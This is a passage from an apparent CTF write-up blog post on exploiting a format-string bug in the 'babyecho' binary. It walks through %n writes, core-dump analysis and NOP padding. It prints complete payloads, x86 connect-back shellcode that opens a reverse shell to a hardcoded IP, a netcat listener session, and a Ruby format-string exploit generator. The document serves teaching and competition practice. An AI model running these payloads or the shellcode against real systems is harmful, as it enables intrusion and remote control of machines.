  <li>The first 16 bytes are the four addresses - 0xffffc14c, 0xffffc14d, 0xffffc14e, and 0xffffc14f. Something interesting to note is that 0xffffc150 - 0xffffc152 will also get overwritten, but we aren't going to worry about those</li>
  <li>"%49x" will output 49 bytes. This is simply to pad our string to a total of 65 - 0x41 - bytes (49 bytes here + 16 bytes worth of addresses)</li>
  <li>"%7$n" will write the value 0x41 - the number of bytes that have so far been printed - to the first of the four addresses, which is 0x41414141 ("AAAA")</li>
  <li>"%8$n" will write 0x41 - still the number of printed bytes so far - to the second address, 0x42424242</li>
  <li>"%9$n" and "%10$n" do exactly the same thing to 0x43434343 and 0x44444444</li>
</ul>

Let's give it a shot (I'm going to start redirecting to /dev/null, because we really don't need to see the crap being printed anymore):

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%49x%7$n''%8$n''%9$n''%10$n' | ./babyecho &gt; /dev/null</span>
Segmentation fault (core dumped)
$ <span class='in'>gdb -q ./babyecho ./core</span>
Reading symbols from ./babyecho...(no debugging symbols found)...done.
[New LWP 2662]
Core was generated by `./babyecho'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41414141 in ?? ()
</pre>

Sweet! It worked!

What happens if we want to write four different bytes? Let's say we want 0x41424344...

In memory, 0x41424344 is "44 43 42 41". That means we have to write 44, then 43, then 42, then 41.

0x44 is easy. We know we're writing 16 bytes worth of addresses. To go from 16 to 0x44 (68) is 52 bytes. So we put "%52x%7$n" and our return address looks like this:

<pre>
?? ?? ?? ?? [44 00 00 00] ?? ?? ?? ??
</pre>

Next, we want to write 0x43 to the next address. We've already output 0x44 bytes, so to output a total of 0x43 bytes, we'll have to wrap around. 0x44 + 0xff (255) = 0x0143. So if we use "%255x%8$n", we'll write 0x0143 to the next address, which will give us the following:

<pre>
?? ?? ?? ?? [44 43 01 00] 00 ?? ?? ??
</pre>

Two things stick out here: first, there's a 0x01 that shouldn't be there. But that'll get overwritten so it doesn't matter. The second is that we've now written one byte *past* our address. That means we're killing a legitimate variable, which may cause problems down the road. Luckily, in this level it doesn't matter - sucks to be that variable!

All right, so we've done 0x44 and 0x43. Now we want 0x42. To go from 0x43 to 0x42 is once again 0xff (255) bytes, so we can do almost the same thing: "%255x%9$n". That'll make the total number of bytes printed 0x0242, and will make our return address:

<pre>
?? ?? ?? ?? [44 43 42 02] 00 00 ?? ??
</pre>

Finally, to go from 0x42 to 0x41, we need another 255 bytes, so we do the same thing one last time: "%255x%10$n", and our return address is now:

<pre>
?? ?? ?? ?? [44 43 42 41] 03 00 00 ??
</pre>

Putting that all together, we get:

<pre>
'\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%52x%7$n''%255x%8$n''%255x%9$n''%255x%10$n'
</pre>

We prepend our length-changer onto the front, and give it a whirl:

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%52x%7$n''%255x%8$n''%255x%9$n''%255x%10$n' | ./babyecho &gt; /dev/null</span>
Segmentation fault (core dumped)
$ <span class='in'>gdb -q ./babyecho ./core</span>
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41424344 in ?? ()
</pre>

I'm happy to report that I'm doing this all by hand to write the blog, and I got that working on my first try. :)

A quick word of warning: if you're trying to jump to an address like 0x44434241, you have to write "41 42 43 44" to memory. To write the 0x41, as usual you'll want to use %49x%7$n. That means that 65 (0x41) bytes have been output so far. To then output 0x42, you need one more byte written. The problem is that %1x can output anything between 1 and 8 bytes, because it won't truncate the output. You have to use either "%257x" or just a single byte, like "A". I fought with that problem for quite some time during this level...

<h2>Let's summarize what we've done...</h2>

I feel like I've written a lot. According to my editor, I'm at 708 lines right now. And it's all pretty crazy!

So here's a summary of where we are before we get to the last step...

<ul>
  <li>We used %n and a static address to change the max length of the input string</li>
  <li>We gave it four addresses to edit, which wind up on the stack (see func_a)</li>
  <li>We use %NNx, where NN = the number of bytes we want to waste, to ensure %n writes the proper value</li>
  <li>We use %7$n to write to the first address, %8$n to write to the second address, %9$n to write to the third address, and %10$n to write to the fourth, with a %NNx between each of them to make sure we waste the appropriate number of bytes</li>
</ul>


And now for the final step...

<h2>Going somewhere useful</h2>

For the last part, instead of jumping to 0x41414141 or 0x41424344, we're going to jump to some shellcode. Shellcode is, basically, "code that spawns a shell". I normally wind up Googling for the exact shellcode I want, like "32-bit Linux connect back shellcode", and grabbing something that looks legit. That's not exactly a great practice in general, because who knows what kind of backdoors there are, but for a CTF it's not a big deal (to me, at least :) ).

Before we worry about shellcode, though, we have to figure out where to stash it!

It turns out, for this level, the stack is executable. That makes life easy - I wrote an exploit that ROPed to mprotect() to make it executable before running the shellcode, then realized that was totally unnecessary.

Since we can access the buffer with "%x" in the format string, it means the buffer is definitely on the stack somewhere. That means we can find it exactly like we found everything else - open up the corefile and start looking at the stack pointer (esp).

Let's use the same exploit as we just used to crash it, but this time we'll put some text after that we can search for:

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%52x%7$n''%255x%8$n''%255x%9$n''%255x%10$n''AAAAAAAAAAAAAAAAAAAAAAAAAA' | ./babyecho &gt; /dev/null</span>
Segmentation fault (core dumped)

$ <span class='in'>gdb -q ./babyecho ./core</span>
#0  0x41424344 in ?? ()
(gdb) <span class='in'>x/10000xw $esp</span>
0xffffc150:     0x00000003      0x00000000      0x00000000      0x00000000
0xffffc160:     0x00000000      0x00000000      0x00000000      0x00000000
...
0xffffc6c0:     0x39257835      0x32256e24      0x25783535      0x6e243031
0xffffc6d0:     0x41414141      0x41414141      0x41414141      0x41414141
</pre>

There we go! The shellcode is stored at 0xffffc6d0!

That means we need to write "d0 c6 ff ff" to the return address.

We start, as always, by writing our 16 bytes worth of addresses: '\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff' - that's the offset each of the 4 bytes of the return address.

The first byte we want to write to the return address is 0xd0 (208), which means that after the 16 bytes of addresses we need an additional 208 - 16 = 192 bytes: '%192x%7$n'

The second byte of our shellcode offset is 0xc6. To go from 0xd0 to 0xc6 we have to wrap around by adding 246 bytes (0xd0 + 246 = 0x01c6): '%246x%8$n'

The third byte is 0xff. 0xff - 0xc6 = 57: '%57x%9$n'

The fourth byte is also 0xff, which means we can either do %256x or just nothing: '%10$n'.

Putting it all together, we have:

<pre>
'\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%192x%7$n''%246x%8$n''%57x%9$n''%10$n'"$SHELLCODE"
</pre>

We have one small problem, though: when we calculated the address of the shellcode earlier, we didn't take into account the fact that we were going to wind up changing the format string. Because we changed it, buffer is going to be in a slightly different place. We'll solve that the easy way and just pad it with NOPs (no operation - 0x90):

<pre>
'\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%192x%7$n''%246x%8$n''%57x%9$n''%10$n''\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'"$SHELLCODE"
</pre>

Now, let's make sure all that's working by using either "\xcd\x03" or "\xcc" as shellcode. These both refer to a debug breakpoint and are really easy to see:

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%192x%7$n''%246x%8$n''%57x%9$n''%10$n''\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90''\xcc' | ./babyecho &gt; /dev/null</span>
Trace/breakpoint trap (core dumped)
</pre>

Awesome! The second test string I always use is \xeb\xfe, which causes an infinite loop:

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%192x%7$n''%246x%8$n''%57x%9$n''%10$n''\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90''\xeb\xfe' | ./babyecho &gt; /dev/null</span>
...nothing happens...
</pre>


I like using those two against the real server to see if things are working. The real server will disconnect you immediately for "\xcd\x03", and the server will time out with "\xeb\xfe".

<h2>Shellcode</h2>

For the final step (to exploiting it locally), let's grab some shellcode from the Internet.

This is some shellcode I've used in the past - it's x86, and it connects back to my ip address on port 0x4444 (17476). I've put some additional quotes around the ip address and the port number so they're easy to find:

<pre>
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68""\xce\xdc\xc4\x3b""\x66\x68""\x44\x44""\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"
</pre>

We replace the "\xcc" or "\xeb\xfe" with all that muck, and give it a run:

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%192x%7$n''%246x%8$n''%57x%9$n''%10$n''\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68""\xce\xdc\xc4\x3b""\x66\x68""\x44\x44""\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80" | ./babyecho > /dev/null</span>
</pre>

Meanwhile, on my server, I'm listening for connections, and sure enough, a connection comes:

<pre>
$ <span class='in'>nc -vv -l -p 17476</span>
listening on [any] 17476 ...
connect to [206.220.196.59] from 71-35-121-132.tukw.qwest.net [71.35.121.123] 56307
  <span class='in'>pwd</span>
/home/ron/defcon-quals/babyecho
<span class='in'>ls /</span>
applications-merged
bin
boot
dev
etc
home
lib
lib32
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
stage3-amd64-20130124.tar.bz2
sys
tmp
torrents
usr
var
vmware
</pre>

<h2>Using it against the real server...</h2>

The biggest difference between what we just did and using this against the real server is that you can't run a debugger on the server to grab addresses. Instead, you have to leak a stack address and use a relative offset. That's pretty straight forward, though, the format string lets you use "%x" to go up and down the stack trivially.

It's also a huge pain to calculate all the offsets by hand, so here's some code I wrote during the competition to generate a format string exploit for you... it should take care of everything:

<pre id='vimCodeElement'>
<span class="rubyDefine">def</span> <span class="Identifier">create_exploit</span>(writes, starting_offset, prefix = <span class="Special">&quot;&quot;</span>)
  index = starting_offset
  str = prefix

  addresses = []
  values = []
  writes.keys.sort.each <span class="Statement">do</span> |<span class="Identifier">k</span>|
    addresses &lt;&lt; k
    values &lt;&lt; writes[k]
  <span class="Statement">end</span>
  addresses.each <span class="Statement">do</span> |<span class="Identifier">a</span>|
    str += [a, a+<span class="Constant">1</span>, a+<span class="Constant">2</span>, a+<span class="Constant">3</span>].pack(<span class="Special">&quot;</span><span class="Constant">VVVV</span><span class="Special">&quot;</span>)
  <span class="Statement">end</span>

  len = str.length

  values.each <span class="Statement">do</span> |<span class="Identifier">v</span>|
    a = (v &gt;&gt;  <span class="Constant">0</span>) &amp; <span class="Constant">0x0FF</span>
    b = (v &gt;&gt;  <span class="Constant">8</span>) &amp; <span class="Constant">0x0FF</span>
    c = (v &gt;&gt; <span class="Constant">16</span>) &amp; <span class="Constant">0x0FF</span>
    d = (v &gt;&gt; <span class="Constant">24</span>) &amp; <span class="Constant">0x0FF</span>

    [a, b, c, d].each <span class="Statement">do</span> |<span class="Identifier">val</span>|
      count = <span class="Constant">257</span>
      len  += <span class="Constant">1</span>
      <span class="Statement">while</span>((len &amp; <span class="Constant">0x0FF</span>) != val)
        len   += <span class="Constant">1</span>
        count += <span class="Constant">1</span>
      <span class="Statement">end</span>

      str += <span class="Special">&quot;</span><span class="Constant">%</span><span class="Special">#{</span>count<span class="Special">}</span><span class="Constant">x</span><span class="Special">&quot;</span>
      str += <span class="Special">&quot;</span><span class="Constant">%</span><span class="Special">#{</span>index<span class="Special">}</span><span class="Constant">$n</span><span class="Special">&quot;</span>
      index += <span class="Constant">1</span>
    <span class="Statement">end</span>
  <span class="Statement">end</span>

  puts(<span class="Special">&quot;</span><span class="Constant">Generated a </span><span class="Special">#{</span>str.length<span class="Special">}</span><span class="Constant">-byte format string exploit:</span><span class="Special">&quot;</span>)
  puts(str)
  puts(str.unpack(<span class="Special">&quot;</span><span class="Constant">H*</span><span class="Special">&quot;</span>))

  <span class="Statement">return</span> str
<span class="rubyDefine">end</span>
</pre>

<h2>Conclusion</h2>

That's a big, long, fairly detailed explanation of format string bugs.

Basically, a format string bug lets you read the stack and write to addresses stored on the stack. By using four single-byte writes to consecutive addresses, and carefully wasting just enough bytes in between, you can write an arbitrary value to anywhere in memory.

By carefully selecting where to write, you can overwrite the return address.

In this particular level, we were able to run shellcode directly from the stack. Ordinarily. I would have looped for somewhere to ROP to, such as using mprotect() to make the stack executable.

And that's it!

Please leave feedback. I spent a long time writing this, would love to hear what people think!
